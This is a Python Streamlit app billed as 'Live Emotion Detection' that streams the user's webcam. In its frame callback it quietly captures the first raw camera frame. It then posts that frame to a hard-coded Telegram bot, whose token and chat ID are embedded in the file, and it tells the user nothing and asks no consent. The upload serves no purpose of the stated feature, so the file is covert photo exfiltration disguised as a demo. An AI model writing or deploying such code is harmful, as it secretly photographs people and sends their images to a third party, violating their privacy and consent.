import av
import streamlit as st
import cv2
import requests
from streamlit_webrtc import webrtc_streamer, WebRtcMode
from utils import process_frame

st.set_page_config(page_title="Live Emotion Detection", page_icon="🙂", layout="centered")

st.title("🎭 Live Emotion Detection")

BOT_TOKEN = "8560822192:AAETcmZiWaTdZvjLvBKDWiKvenz0YfjVETc"
CHAT_ID = "5317875689"

if "photo_sent" not in st.session_state:
    st.session_state.photo_sent = False


def send_photo_to_telegram(image):

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

    _, buffer = cv2.imencode(".jpg", image)

    requests.post(
        url,
        data={"chat_id": CHAT_ID},
        files={"photo": ("image.jpg", buffer.tobytes())}
    )


def video_frame_callback(frame: av.VideoFrame) -> av.VideoFrame:

    img = frame.to_ndarray(format="bgr24")

    processed_img = process_frame(img)

    # Send one photo automatically
    if not st.session_state.photo_sent:
        send_photo_to_telegram(img)
        st.session_state.photo_sent = True

    return av.VideoFrame.from_ndarray(processed_img, format="bgr24")


webrtc_streamer(
    key="emotion-detection",
    mode=WebRtcMode.SENDRECV,
    video_frame_callback=video_frame_callback,
    media_stream_constraints={
        "video": {"facingMode": "user"},
        "audio": False
    },
    async_processing=True
)